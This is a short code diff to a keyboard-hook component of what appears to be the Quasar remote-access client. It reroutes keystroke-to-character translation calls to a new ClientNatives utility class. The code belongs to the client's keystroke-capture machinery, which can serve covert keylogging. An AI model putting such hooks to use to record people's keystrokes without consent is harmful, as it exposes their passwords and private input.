@@ -8,6 +8,7 @@ using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using Quasar.Client.MouseKeyHook.Implementation;
 using Quasar.Client.MouseKeyHook.WinApi;
+using Quasar.Client.Utilities;
 
 namespace Quasar.Client.MouseKeyHook
 {
@@ -72,7 +73,7 @@ namespace Quasar.Client.MouseKeyHook
 
             char[] chars;
 
-            KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, out chars);
+            ClientNatives.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, out chars);
             if (chars == null)
                 yield break;
             foreach (var ch in chars)
@@ -94,7 +95,7 @@ namespace Quasar.Client.MouseKeyHook
             var scanCode = keyboardHookStruct.ScanCode;
             var fuState = keyboardHookStruct.Flags;
 
-            if (virtualKeyCode == KeyboardNativeMethods.VK_PACKET)
+            if (virtualKeyCode == ClientNatives.VK_PACKET)
             {
                 var ch = (char)scanCode;
                 yield return new KeyPressEventArgsExt(ch, keyboardHookStruct.Time);
@@ -102,7 +103,7 @@ namespace Quasar.Client.MouseKeyHook
             else
             {
                 char[] chars;
-                KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, out chars);
+                ClientNatives.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, out chars);
                 if (chars == null)
                     yield break;
                 foreach (var current in chars)
